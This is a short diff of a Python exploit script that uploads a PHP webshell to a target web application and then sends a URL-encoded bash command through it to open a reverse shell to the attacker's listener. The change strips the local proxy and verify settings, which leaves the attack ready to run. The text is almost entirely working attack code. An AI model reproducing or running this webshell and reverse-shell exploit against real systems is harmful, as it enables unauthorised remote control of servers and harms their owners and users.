@@ -54,7 +54,7 @@ def main():
     try: 
         # Upload the PHP script:
         print('[*] Uploading the webshell ...')
-        response = requests.post(url, headers=req_headers, data=POST_data, allow_redirects=False, verify=False, proxies={"http":"http://127.0.0.1:8080"})
+        response = requests.post(url, headers=req_headers, data=POST_data, allow_redirects=False)
 
       # Checking if the webshell has been uploaded
         if 'has been uploaded' in response.text:
@@ -62,7 +62,7 @@ def main():
             print('[*] Running the reverse shell ...')
             try:
               # Triggering the reverse shell
-                resp = requests.get(f"http://{target_IP}:{target_Port}/{target_URI}/images/webshell.php?cmd=bash%20%2Di%20%3E%26%20%2Fdev%2Ftcp%2F{local_IP}%2F{local_port}%200%3E%261", timeout=3, verify=False, proxies={"http":"http://127.0.0.1:8080"})
+                resp = requests.get(f"http://{target_IP}:{target_Port}/{target_URI}/images/webshell.php?cmd=bash%20%2Di%20%3E%26%20%2Fdev%2Ftcp%2F{local_IP}%2F{local_port}%200%3E%261", timeout=3)
             except requests.exceptions.Timeout:
               # If the request timedout, it means that the reverse shell was successfull
                 print('[*] Check your netcat listener !!')
